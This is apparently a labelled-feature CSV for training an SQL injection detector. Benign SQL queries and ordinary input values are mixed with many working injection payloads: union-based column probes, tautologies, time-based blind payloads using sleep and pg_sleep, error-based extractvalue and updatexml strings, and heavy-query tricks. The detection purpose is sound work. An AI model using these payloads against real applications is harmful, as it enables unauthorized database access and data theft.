,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
3991,"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,0,4,27,0,0,36,2,1,0,0,1,69,37,0,1,5.3612921657094255,8.158268106249867
3338,1   )    )    as trin where 8843  =  8843,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0,3.713572066704308,4.939896154656966
19660," select orders.orderid, customers.customername, shippers.shippername from   (  (  orders inner join customers on orders.customerid  =  customers.customerid )   inner join shippers on orders.shipperid  =  shippers.shipperid ) ;",0,0,16,0,0,25,0,0,0,0,0,175,0,0,3,5.420534999272286,8.289131787627612
27283,select entire,0,0,0,0,0,1,0,0,0,0,0,12,0,0,1,2.5649493574615367,3.1155015354702966
6831,"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  ",0,1,40,0,0,54,0,7,1,0,0,58,41,6,1,5.541263545158426,8.559367492058051
26209,select * from north where church = 'especially',2,0,4,0,0,7,0,0,1,0,0,36,0,0,1,3.8501476017100575,5.178036175455065
12593,forfoleda,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
17953,de_leon,0,0,1,0,0,0,0,0,0,0,0,6,0,0,0,1.9459101490553128,2.25279015210122
1361,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,0,0,11,1,0,18,0,1,3,0,0,31,2,0,2,4.430816798843313,6.245637257588747
7762,1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',4,0,12,0,0,12,2,2,0,0,0,6,9,0,0,4.07753744390572,5.5852871348767055
3432,1'+  (  select iwbs where 4939  =  4939,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1,3.6635616461296463,4.853884482035236
17006,e41t8r,0,0,0,0,0,0,0,0,0,0,0,3,3,0,0,1.791759469228055,2.0498957009511405
14838,90179643r,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
26755,select * from fur  where nature not like '[four]%',2,0,6,0,0,8,1,1,1,0,0,35,0,0,1,3.912023005428146,5.287509109454676
6440,-1602' or 3038  =  3038,1,0,3,0,0,4,0,1,1,0,0,2,12,0,0,3.1354942159291497,3.983240309714999
11927,dollie,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
11394,toperzer1,0,0,0,0,0,0,0,0,0,0,0,8,1,0,0,2.19722457733622,2.593591245490939
2564,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1,0,12,0,0,4,1,0,1,0,0,14,40,0,1,4.248495242049359,5.900560584269694
6080,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",4,0,26,0,0,30,0,1,2,0,1,49,47,0,2,5.236441962829949,7.886185616699407
5799,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1,0,13,1,0,5,0,0,3,0,0,14,40,0,1,4.31748811353631,6.030055566276218
20924,select top 3 * from lesson select * from wire 3select * from pupil,0,0,3,0,0,13,0,0,3,0,0,48,2,0,3,4.189654742026425,5.791153910047609
27748,select avg ( property ) from flame select sum ( melted ) ,0,0,4,0,0,12,0,0,0,0,0,41,0,0,4,4.04305126783455,5.522643883333643
941,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",0,1,12,1,0,5,0,0,3,0,0,14,36,0,1,4.248495242049359,5.900560584269694
1971,"-4546'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||c",1,0,42,0,0,53,0,8,1,0,0,69,40,6,1,5.541263545158426,8.559367492058051
13392,63545647m,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
15165,1596,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
4061,"1""  )   where 9827  =  9827",0,1,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
2107,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,3,0,7,0,0,9,0,1,0,0,0,28,1,0,1,3.970291913552122,5.391515666300752
1349,-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj,4,0,9,0,0,11,0,2,2,0,0,17,16,0,0,4.0943445622221,5.615932130190505
28093,"insert into feature  ( solar, likely, quietly )  values  ( 'shot', 'rest', 'floor' )  ",6,0,14,0,0,14,0,0,0,0,0,54,0,0,0,4.454347296253507,6.2908506611672514
3042,1 where 9404  =  9404,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0,3.044522437723423,3.839958531231341
22675,select * from property where congress = 'additional'  and  ( during = 'dark' or street = 'stick' ) ,6,0,12,0,0,18,0,2,1,0,0,67,0,0,1,4.59511985013459,6.564633716663423
16482,9.43e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
17183,fonterosa vjar,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
26165,"  select * from gun where slave not in  ( 'army', 'line', 'ground' )  ",6,0,11,0,0,14,0,1,1,0,0,42,0,0,1,4.248495242049359,5.900560584269694
17460,karzau@asdn.edu,0,0,2,0,0,0,0,0,0,0,0,13,0,0,0,2.70805020110221,3.326353218260614
13389,3423,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
25845,select top 3 * from structure where oldest = 'needs',2,0,4,0,0,9,0,0,1,0,0,38,1,0,2,3.951243718581428,5.357417698153898
7625,select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,0,0,10,0,0,21,0,0,1,0,0,42,20,0,2,4.709530201312334,6.791357624410744
6343,"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,19,1,0,22,0,1,3,0,0,68,18,0,2,4.948759890378168,7.277936646208279
3362,-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144,1,0,40,0,0,54,0,8,1,0,0,66,43,7,2,5.541263545158426,8.559367492058051
29948,select * from something where stock = 'let'  and  ( take = 'hearing' or engine = 'ants' ) ,6,0,12,0,0,18,0,2,1,0,0,58,0,0,1,4.499809670330265,6.378649993862576
21387,select * from sides where including = 'tobacco'  or gone = 'father',4,0,7,0,0,11,0,1,1,0,0,48,0,0,1,4.204692619390966,5.819025031871101
6014,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,0,11,0,0,14,0,1,0,0,0,10,10,0,0,4.23410650459726,5.873719016140452
3396,select case when 4537  =  8418 then 1 else null end--,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1,3.970291913552122,5.391515666300752
27261,"  select copperid as id, thee as connected from up",0,0,1,0,0,9,0,0,0,0,0,39,0,0,1,3.912023005428146,5.287509109454676
24322,select visit ( s )  from service union,0,0,2,0,0,7,0,0,0,0,0,28,0,0,1,3.6375861597263857,4.809458789423759
30054,"   select pool, thick, relationship from motion where stock  is null",0,0,2,0,0,10,0,0,0,1,0,53,0,1,1,4.219507705176107,5.846543550882007
26063,select * from upper where strip not like 'steady%',2,0,4,0,0,8,1,1,1,0,0,38,0,0,1,3.912023005428146,5.287509109454676
6082,"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",4,0,17,0,0,19,2,2,1,0,0,34,13,0,2,4.653960350157523,6.680760037190909
17693,elezaro,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
26730,select * from soap fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,39,2,0,3,3.9318256327243257,5.322755734775789
29386,select min ( repeat )  as chemical from rain,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
16829,"sant sever 63, 6-b",0,0,2,0,0,3,0,0,1,0,0,10,3,0,0,2.8903717578961645,3.6015010896570807
17774,2111,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
12464,"avinguda carrilet, 21,",0,0,2,0,0,2,0,0,0,0,0,16,2,0,0,3.091042453358316,3.9129887722739327
7570,1'+  (  select 'jaok' where 2592  =  2592,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1,3.713572066704308,4.939896154656966
25082,"  select * from let where plural in  ( 'oil', 'hang', 'fifty' )  ",6,0,11,0,0,13,0,0,1,0,0,38,0,0,1,4.174387269895637,5.762920220853171
21632,select * from behavior where uncle not like 'ruler%',2,0,4,0,0,8,1,1,1,0,0,40,0,0,1,3.951243718581428,5.357417698153898
30711,select up from recently union all select thank from tip order by pack,0,0,0,0,0,12,0,0,0,0,0,57,0,0,3,4.23410650459726,5.873719016140452
8992,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",4,0,19,0,0,26,0,2,1,0,0,86,9,0,2,5.068904202220232,7.528834455029986
9318,1'   )    )    and   (  5091  =  8681  )  *8681 and    (    (   'xevm'  =  'xevm,4,0,13,0,0,15,0,2,1,0,0,14,13,0,0,4.382026634673881,6.152384767567401
17367,lagunaseca,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
25580,select * from may where oxygen not between 'trail' and 'bring',4,0,5,0,0,10,0,2,1,0,0,47,0,0,1,4.127134385045092,5.675937336868984
13039,6320,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
15484,47529,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
24217,select becoming ( s )  from something left join,0,0,2,0,0,8,0,0,0,0,0,36,0,0,2,3.8501476017100575,5.178036175455065
25342,delete from speech where move = 'coat',2,0,3,0,0,6,0,0,0,0,0,29,0,0,0,3.6375861597263857,4.809458789423759
16741,68689912k,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
15438,01633578a,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
805,order by,0,0,0,0,0,1,0,0,0,0,0,7,0,0,1,2.079441541679836,2.432300417938136
25843,select top 50 percent * from mother,0,0,1,0,0,6,0,0,1,0,0,26,2,0,2,3.555348061489413,4.669921102482963
4106,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,0,11,0,0,5,0,0,1,0,0,14,36,0,1,4.23410650459726,5.873719016140452
23214,"  select * from nobody where vertical in  ( 'neighborhood', 'spent', 'opportunity' )  ",6,0,11,0,0,13,0,0,1,0,0,59,0,0,1,4.454347296253507,6.2908506611672514
23297,select top 3 * from daily where wood = 'appropriate' select * from income,2,0,5,0,0,13,0,0,2,0,0,54,1,0,3,4.290459441148391,5.97916802637938
4389,"1,iif  (  6625  =  6625,1,1/0  )  ",0,0,7,0,0,6,0,0,1,0,0,3,12,0,0,3.5263605246161616,4.621137163019105
2937,-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,1,0,5,0,0,11,0,1,1,0,0,13,20,0,0,4.02535169073515,5.490616172199279
6358,"1""  )   as nfpe where 2679  =  2679",0,1,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
16157,aloguer,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
14891,92251391r,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
9046,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",4,0,36,0,0,61,0,2,2,0,0,113,55,0,7,5.777652323222656,9.102587570813418
20220,select top 3 * from yellow,0,0,1,0,0,5,0,0,1,0,0,19,1,0,2,3.258096538021482,4.179397132269193
17950,6120,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
996,"-3707""   )    )     )   or 8571  =  8571--",0,1,8,1,0,7,0,1,3,0,0,2,12,0,0,3.737669618283368,4.981567234930947
8646,"1,  (  case when 2872  =  2872 then 1 else null end  )  ",0,0,4,0,0,13,0,0,0,1,0,23,10,1,0,4.02535169073515,5.490616172199279
28282,select * from mouth where    not current = 'hall',2,0,4,0,0,8,0,1,1,0,0,34,0,0,1,3.8918202981106265,5.251655965920898
10891,"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",0,1,12,1,0,19,0,1,2,0,0,22,18,0,0,4.543294782270004,6.463181585426342
29646,select count ( * )  as toward,0,0,3,0,0,6,0,0,1,0,0,19,0,0,2,3.367295829986474,4.357111686472804
2594,-6423'  )   or 6872  =  6872,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0,3.332204510175204,4.299691526222142
8638,"1%""   )    )    order by 1--",0,1,6,1,0,5,1,0,2,0,0,7,2,0,1,3.332204510175204,4.299691526222142
26398,select lonely,0,0,0,0,0,1,0,0,0,0,0,12,0,0,1,2.5649493574615367,3.1155015354702966
17075,parkin,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
24962,select min ( plastic )  as rocket from earlier,0,0,2,0,0,8,0,0,0,0,0,35,0,0,1,3.828641396489095,5.140218969441503
16577,22440,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
12547,braham,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
18330,78739097t,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18349,39696,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
14939,lazure,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
29844,select * from swing where sold = 'element',2,0,4,0,0,7,0,0,1,0,0,31,0,0,1,3.737669618283368,4.981567234930947
19424,select option_value from wp_options where option_name  =  '_options_location_address' limit 1,2,0,9,0,0,9,0,0,0,0,0,72,1,0,1,4.532599493153256,6.442340659113198
15003,34475,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
1085,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",0,0,8,0,0,12,0,0,1,0,0,25,28,0,1,4.418840607796598,6.222685223035155
9834,"1"" where 9461  =  9461",0,1,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
4832,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",4,0,17,0,0,17,0,2,1,0,0,20,16,0,0,4.61512051684126,6.603993955492575
15312,5370,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
27527,select top 3 * from tone where lesson = 'stepped' select * from needle,2,0,5,0,0,13,0,0,2,0,0,51,1,0,3,4.248495242049359,5.900560584269694
18610,kinsman,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
27090,select count ( distinct closer )  from pipe,0,0,2,0,0,7,0,0,0,0,0,33,0,0,2,3.7612001156935615,5.022400427811018
435,or 'whatever' in   (  'whatever'  ) ,4,0,6,0,0,6,0,0,0,0,0,20,0,0,0,3.58351893845611,4.717530264472627
25349,select top 50 percent * from respect,0,0,1,0,0,6,0,0,1,0,0,27,2,0,2,3.58351893845611,4.717530264472627
13018,fernn caballero,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
8849,"1%' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",4,0,34,0,0,42,2,2,2,0,1,52,71,0,4,5.54907608489522,8.577020660447667
6789,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,42,1,0,48,0,6,2,2,0,71,25,9,0,5.4638318050256105,8.385495126958071
23173,"insert into gradually ( teeth, surprise, different, visitor, know, habit )  values  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )  ",13,0,28,0,0,21,0,0,0,0,0,93,0,0,0,4.976733742420574,7.335959393126002
13982,estorbar,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
20355,"select * from fruit where winter between ""shoot"" and    ""tape""",0,4,5,0,0,9,0,1,1,0,0,45,0,0,1,4.127134385045092,5.675937336868984
910,"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113 ",0,1,40,0,0,53,0,7,1,0,0,68,40,6,1,5.541263545158426,8.559367492058051
12854,av. vigo 144 2?h,0,0,2,0,0,3,0,0,0,0,0,7,4,0,0,2.772588722239781,3.4229084603450888
307, and 1 in   (  select var from temp  )  --,0,0,4,1,0,10,0,1,2,0,0,22,1,0,1,3.737669618283368,4.981567234930947
14995,lecompte,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
10691,-4173'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  ( ,1,0,44,0,0,55,0,8,1,0,0,56,36,7,1,5.541263545158426,8.559367492058051
28088,select * from liquid order by pond,0,0,1,0,0,6,0,0,1,0,0,27,0,0,2,3.5263605246161616,4.621137163019105
12054,"plza. carmelo solis, 78, 4?g",0,0,4,0,0,4,0,0,0,0,0,17,3,0,0,3.332204510175204,4.299691526222142
12639,4.86e+14,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
23803,"  select * from simply where rush not in  ( 'pride', 'general', 'hold' )  ",6,0,11,0,0,14,0,1,1,0,0,46,0,0,1,4.30406509320417,6.004758445183105
9838,1'   )    )    as txxn where 7884  =  7884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,0,51,1,0,80,0,1,12,0,0,89,55,12,1,5.916202062607435,9.429859885499134
22534,select * from spend where search between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,36,16,0,1,4.248495242049359,5.900560584269694
25193,select avg ( price ) from safe,0,0,2,0,0,6,0,0,0,0,0,22,0,0,2,3.4011973816621555,4.412867051146341
23869,select accident ( s )  from dull,0,0,2,0,0,6,0,0,0,0,0,23,0,0,1,3.4657359027997265,4.519779854678687
9043,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",1,0,11,0,0,5,1,0,1,0,0,14,32,0,1,4.174387269895637,5.762920220853171
13337,leda,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
18689,ateniesa,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
14530,cooperma,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
17511,57879425v,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
14525,amenta,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
1258,"-6940'  )   union all select 3042,3042,3042,3042,3042#",1,0,8,0,0,5,0,0,1,0,0,14,24,0,1,3.9889840465642745,5.42506920217274
9788,"1   )    )     )   union all select null,null,null,null,null#",0,0,8,0,0,7,0,0,0,5,0,34,1,5,1,4.110873864173311,5.646144513813471
21819,select top 3 * from author where house = 'stop' select * from education,2,0,5,0,0,13,0,0,2,0,0,52,1,0,3,4.262679877041316,5.927077040928176
16798,grin,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
18050,moriyama,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
22358,select wheel from taken union select grandmother from until order by colony,0,0,0,0,0,11,0,0,0,0,0,64,0,0,3,4.31748811353631,6.030055566276218
2258,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",0,0,8,0,0,4,0,0,1,0,0,14,32,0,1,4.060443010546419,5.554195840989334
14403,valbuena de duero,0,0,0,0,0,2,0,0,0,0,0,15,0,0,0,2.833213344056216,3.514446415767603
23860,"insert into amount ( border, slide, north, egg, draw, stock )  values  ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )  ",13,0,28,0,0,21,0,0,0,0,0,94,0,0,0,4.983606621708336,7.350251518992875
9285,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",3,0,20,0,0,18,1,1,1,0,0,63,5,0,2,4.820281565605037,7.014493020202725
13548,3146,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
14770,6.30e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
13293,skolnik-daye@joll.ws,0,0,3,0,0,0,0,0,1,0,0,17,0,0,0,2.995732273553991,3.7638991627446954
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",3,0,13,1,0,17,0,2,3,0,0,42,3,0,2,4.418840607796598,6.222685223035155
13970,barlovento,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
6862,"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",3,0,17,1,0,21,0,1,3,0,0,45,15,0,0,4.836281906951478,7.047030967710781
12196,22115972t,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
9661,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,1,0,8,1,0,14,0,1,2,0,0,19,10,0,0,4.174387269895637,5.762920220853171
13505,kangelis,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
7425,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,4,0,8,0,0,11,0,1,0,0,0,25,2,0,0,4.04305126783455,5.522643883333643
16600,cr48e24n,0,0,0,0,0,0,0,0,0,0,0,4,4,0,0,2.079441541679836,2.432300417938136
12049,maribeth4,0,0,0,0,0,0,0,0,0,0,0,8,1,0,0,2.19722457733622,2.593591245490939
113, or 1  =  1 or ''  =  ',3,0,5,0,0,8,0,2,0,0,0,4,2,0,0,3.1354942159291497,3.983240309714999
16327,bazet aguil,0,0,0,0,0,1,0,0,0,0,0,10,0,0,0,2.3978952727983707,2.8749024412290907
23190,select * from nothing where social = 'simply' limit 3,2,0,4,0,0,9,0,0,1,0,0,39,1,0,1,3.970291913552122,5.391515666300752
26728,select * from write fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,33,1,0,3,3.7612001156935615,5.022400427811018
16401,baer,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
10724,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'lgcw'  =  'lgcw",4,0,30,0,0,38,0,2,1,0,1,54,32,0,3,5.3706380281276624,8.17883688583344
19457,"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c886d67719' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",6,0,36,0,0,32,0,3,1,0,0,160,14,0,2,5.545177444479562,8.568208781379385
21213,select top 50 percent * from body,0,0,1,0,0,6,0,0,1,0,0,24,2,0,2,3.49650756146648,4.571113592379885
11080,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'ydxb'  =  'ydxb",4,0,28,0,0,29,0,5,0,0,0,48,16,4,0,5.0238805208462765,7.434291790904462
21984,select * from dinner where layers = 'ranch'  and  ( stage = 'suit' or useful = 'heart' ) ,6,0,12,0,0,18,0,2,1,0,0,57,0,0,1,4.48863636973214,6.357017110069445
19758,where productid  =  any  ( select productid   from orderdetails where quantity > 99 ) ;,0,0,5,0,0,14,0,0,0,0,0,61,2,0,1,4.465908118654584,6.313121924766899
1053,select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
29707,"select * from heard where certainly between ""place"" and    ""ruler""",0,4,5,0,0,9,0,1,1,0,0,49,0,0,1,4.189654742026425,5.791153910047609
30447,"  update fair set those =  'wore', city =  'ship' where weak =  possibly",4,0,8,0,0,13,0,0,0,0,0,47,0,0,0,4.276666119016055,5.953276820822519
19574,select * from customers  where customerid = 1;,0,0,3,0,0,7,0,0,1,0,0,34,1,0,1,3.828641396489095,5.140218969441503
16820,"calle juana ibarborou 134,",0,0,1,0,0,3,0,0,0,0,0,19,3,0,0,3.258096538021482,4.179397132269193
10548,"1""   )    )    as knyf where 8109  =  8109 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,1,19,1,0,25,0,1,3,0,0,42,23,0,0,4.969813299576001,7.321582942195207
11895,en8og1da,0,0,0,0,0,0,0,0,0,0,0,6,2,0,0,2.079441541679836,2.432300417938136
3144,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",0,0,14,0,0,21,0,1,1,0,0,72,12,0,2,4.919980925828125,7.218492443414831
